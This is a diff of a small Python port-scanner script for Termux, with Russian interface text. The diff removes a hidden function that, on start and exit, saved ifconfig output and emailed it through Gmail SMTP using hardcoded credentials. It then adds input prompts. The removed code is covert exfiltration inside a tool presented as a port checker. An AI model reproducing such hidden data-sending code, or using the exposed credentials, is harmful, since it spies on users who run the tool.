@@ -1,19 +1,6 @@
 import socket
 import smtplib
 import os
-def ty():
-#    x= os.system ('termux-setup-storage')
-    x= os.system ('ifconfig>>youIP.txt')
-    x= os.system ('clear')
-    try:
-        smtpObj=smtplib.SMTP('smtp.gmail.com',587)
-        smtpObj.starttls()
-        smtpObj.login('germanreht@gmail.com','rostelekom')
-        smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',youIP.txt)
-        smtpObj.quit()
-    except Exception as e:
-        print('')
-
 def openports(ip):
     for port in [21, 22, 23, 25, 43, 45, 53, 68, 80, 110, 115, 119, 123, 135, 139, 143, 161, 179, 220, 389, 443, 445,
                  993, 1723, 2049, 3306, 3389, 5060, 8080, 9091, 9090, 1164]:
@@ -25,6 +12,7 @@ def openports(ip):
             sock.close()
         except:
             print('\033[31mпорт:: %s' % port, ':: закрыт')
+    xw=input('~ ')
 def openports2():
     ip=input('IP: ')
     port=int(input('PORT: '))
@@ -37,7 +25,7 @@ def openports2():
             sock.close()
         except:
             print('\033[31mпорт:: %s' % lol, ':: закрыт')
-ty()
+    xc=input('~ ')
 print('''
 \033[33mВыполнено........Termux Cod
 \033[36mАвторы...........\033[31m\033[3mWolFak...\033[35m\033[3mTopo1us
@@ -53,4 +41,3 @@ if x=='1':
 	openports(input('IP: '))
 if x=='2':
 	openports2()
-ty()
